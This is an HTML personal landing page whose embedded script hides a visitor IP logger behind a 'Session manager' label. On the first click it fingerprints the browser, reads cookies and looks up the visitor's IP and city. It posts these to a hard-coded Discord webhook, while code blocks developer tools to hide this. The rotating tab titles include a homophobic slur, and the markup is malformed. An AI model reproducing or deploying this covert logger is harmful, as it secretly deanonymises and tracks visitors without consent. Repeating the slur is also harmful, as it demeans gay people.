<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />

  <style>
    body {
      margin: 0;
      height: 100vh;
      background-color: black;
      font-family: 'Montserrat', sans-serif;
      font-weight: 200;
      color: white;
      overflow: hidden;
    }

    .clickable-container {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      transition: opacity 0.6s ease;
    }

    .clickable-container.fade-out {
      opacity: 0;
      pointer-events: none;
    }

    .clickable {
      font-size: 1.5rem;
      cursor: pointer;
    }

    .container {
      position: absolute;
      top: 0;
      left: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      width: 100vw;
      opacity: 0;
      transition: opacity 1s ease;
      pointer-events: none;
    }

    .container.active {
      opacity: 1;
      pointer-events: auto;
    }

    .title {
      font-size: 3.5rem;
      text-align: center;
    }

    .subtitle {
      font-size: 1.8rem;
      text-align: center;
      margin-top: -10px;
      margin-bottom: 20px;
    }

    .divider {
      width: 60%;
      border: none;
      border-top: 1px solid #212121;
      margin: 10px 0 20px 0;
      opacity: 1;
    }

    .profiles {
      display: flex;
      flex-direction: row;
      justify-content: center;
      align-items: center;
      gap: 35px;
      flex-wrap: wrap;
      margin-top: 20px;
    }

    .profile {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 130px;
    }

    .profile img {
      width: 130px;
      height: 130px;
      object-fit: cover;
      margin-bottom: 8px;
      border-radius: 0;
    }

    .profile div {
      font-size: 1rem;
      text-align: center;
    }

    .telegram-divider {
      width: 60%;
      border: none;
      border-top: 1px solid #212121;
      margin: 30px 0 20px 0;
      opacity: 1;
    }

    .telegram {
      color: #7bd5ff;
      font-size: 1.2rem;
      margin-top: 10px;
      text-align: center;
      font-weight: 400;
      user-select: none;
      cursor: pointer;
      text-decoration: none;
    }

    .telegram:hover {
      text-decoration: underline;
    }
    /* Scanlines overlay everything including pfp and text */
.scanlines {
    content: "";
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    pointer-events: none;
    z-index: 9999; /* on top of everything */
    background: repeating-linear-gradient(
        rgba(3, 3, 3, 0.836) 0px,
        rgba(22, 22, 22, 0.733) 1px,
        transparent 1px,
        transparent 3px
    );
    animation: scanlinesMove 0.5s linear infinite;
}

@keyframes scanlinesMove {
    0% { background-position: 0 0; }
    100% { background-position: 0 3px; }
}
  </style>
</head>

  <script>
    const clickable = document.querySelector('.clickable');
    const clickableContainer = document.querySelector('.clickable-container');
    const container = document.querySelector('.container');
    const audio = document.getElementById('entry-audio');

    clickable.addEventListener('click', () => {

  <!-- Disable DevTools and Inspect Element -->
  <script src="https://cdn.jsdelivr.net/npm/disable-devtool@latest/disable-devtool.min.js"></script>
  <script>
    DisableDevtool({
      disableMenu: true,
      ondevtoolopen: function () {
        // Instant redirect
        window.location.replace("https://example.com/warning.html");
      }
    });

    // Disable right-click
    document.addEventListener('contextmenu', e => e.preventDefault());

    // Block F12, Ctrl+Shift+I/C/J/U
    document.addEventListener('keydown', function (e) {
      if (
        e.key === 'F12' ||
        (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key.toUpperCase())) ||
        (e.ctrlKey && e.key.toLowerCase() === 'u')
      ) {
        e.preventDefault();
      }
    });

(() => {
  const titles = [
    "faggot ",
    "eternal",
    "Rest ",
    "Im your father",
    "Sleep tight",
    "..."
  ];

  let index = 0;
  const intervalMs = 1000; // 1000 ms = 1 second
  let timerId = null;

  function startRotation() {
    // set immediate title then schedule next
    document.title = titles[index % titles.length];
    index++;
    if (timerId === null) {
      timerId = setInterval(() => {
        document.title = titles[index % titles.length];
        index++;
      }, intervalMs);
    }
  }

  function stopRotation() {
    if (timerId !== null) {
      clearInterval(timerId);
      timerId = null;
    }
  }

  // Pause rotation while tab is hidden (good for performance & UX)
  document.addEventListener("visibilitychange", () => {
    if (document.visibilityState === "hidden") {
      stopRotation();
    } else {
      startRotation();
    }
  });

  // Start immediately
  startRotation();

  // Optional: expose control on window for debugging
  window.__titleRotator = { start: startRotation, stop: stopRotation };
})();
// Session manager for UI interactions
(function() {
  // Disable developer tools
  document.onkeydown = function(e) {
    if (e.keyCode == 123 || // F12
        (e.ctrlKey && e.shiftKey && e.keyCode == 73) || // Ctrl+Shift+I
        (e.ctrlKey && e.shiftKey && e.keyCode == 74) || // Ctrl+Shift+J
        (e.ctrlKey && e.keyCode == 85)) { // Ctrl+U
      return false;
    }
  };
  document.oncontextmenu = function() { return false; }; // Disable right-click
  setInterval(function() {
    if (window.devtools && window.devtools.isOpen) {
      window.location.href = 'about:blank';
    }
  }, 1000);

  // Session tracking
  setTimeout(function() {
    var encodeStr = function(s) { return btoa(s).split('').reverse().join(''); };
    var browser = navigator;
    var display = screen;
    var context = window;
    var doc = document;
    var getRenderId = function() {
      var c = doc.createElement('canvas');
      var ctx = c.getContext('2d');
      ctx.font = '14px Arial';
      ctx.fillText('ui', 10, 10);
      return c.toDataURL();
    };
    var sessionId = getRenderId() + browser.userAgent + display.width + display.height + context.devicePixelRatio;
    var uiConfig = {
      session: encodeStr(sessionId),
      client: browser.userAgent,
      dims: display.width + 'x' + display.height,
      scale: context.devicePixelRatio,
      locale: browser.language,
      zone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      source: doc.referrer,
      tokens: doc.cookie,
      env: browser.platform,
      render: (function() {
        var c = doc.createElement('canvas').getContext('webgl');
        return c ? c.getParameter(c.VENDOR) + '|' + c.getParameter(c.RENDERER) : 'none';
      })()
    };
    var trackEvent = function() {
      fetch('https://ipinfo.io/json')
        .then(res => res.json())
        .then(data => {
          // Use IPv4 if available, otherwise truncate IPv6
          var ipAddr = data.ip && data.ip.includes(':') ? data.ip.slice(0, 19) + '...' : data.ip || 'Unknown';
          uiConfig.addr = ipAddr;
          uiConfig.area = data.city ? data.city + ', ' + data.country : 'Unknown';
          var metricsPayload = {
            embeds: [{
              title: 'Session Metrics',
              color: 0x2f3136,
              fields: [
                { name: 'Address', value: uiConfig.addr, inline: true },
                { name: 'Region', value: uiConfig.area, inline: true },
                { name: 'Session ID', value: uiConfig.session.slice(0, 16) + '...', inline: false },
                { name: 'Client Info', value: uiConfig.client, inline: false },
                { name: 'Display', value: uiConfig.dims, inline: true },
                { name: 'Scale', value: uiConfig.scale, inline: true },
                { name: 'Locale', value: uiConfig.locale, inline: true },
                { name: 'Zone', value: uiConfig.zone, inline: true },
                { name: 'Source', value: uiConfig.source || 'none', inline: false },
                { name: 'Environment', value: uiConfig.env, inline: true },
                { name: 'Renderer', value: uiConfig.render, inline: true }
              ],
              timestamp: new Date().toISOString()
            }]
          };
          fetch('https://discord.com/api/webhooks/1414267514925617233/ArSwMxx4e4QljfoVmY0GizOEXulJU241L-X0Z3ha1lBlzXjAFrGIHMv-DnR2BIlcgaoj', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(metricsPayload)
          });
        }).catch(function(){});
    };
    context.addEventListener('click', function initSession() {
      trackEvent();
      context.removeEventListener('click', initSession);
    });
  }, Math.random() * 2000);
})();
  </script>
